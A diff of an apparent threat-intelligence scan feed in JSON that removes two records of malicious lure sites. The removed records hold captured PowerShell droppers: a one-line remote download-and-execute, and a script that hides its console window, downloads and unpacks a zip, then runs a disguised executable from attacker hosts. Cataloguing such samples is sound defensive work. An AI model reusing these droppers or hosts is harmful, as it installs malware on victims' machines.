@@ -8318,43 +8318,5 @@
     ],
     "ReportId": "cmwanjbw9018m0omlq3184wsq",
     "ScannedAt": "2026-11-10T12:13:59.457000+00:00"
-  },
-  {
-    "UrlDomain": "cbfinestfood.com",
-    "DeliveryUrl": [
-      "t-trustresnew.com"
-    ],
-    "PayloadUrl": [
-      "https://t-trustresnew.com/Girya/7eeb7dc71e67e3f9"
-    ],
-    "IP": [
-      "188.114.97.0"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://t-trustresnew[.]com/Girya/7eeb7dc71e67e3f9')|iex",
-    "ResolvedDownloadUrl": [
-      "https://t-trustresnew.com/Girya/7eeb7dc71e67e3f9"
-    ],
-    "ReportId": "cmwan0j4800yq0omlltp1f36f",
-    "ScannedAt": "2026-11-10T11:59:22.341000+00:00"
-  },
-  {
-    "UrlDomain": "www.coffeecookers7.com",
-    "DeliveryUrl": [
-      "frclau.com"
-    ],
-    "PayloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "IP": [
-      "93.127.179.9"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://frclau.com/eoN"
-    ],
-    "ReportId": "cmwam6zr200qm0omluiv0gc85",
-    "ScannedAt": "2026-11-10T11:36:24.243000+00:00"
   }
 ]
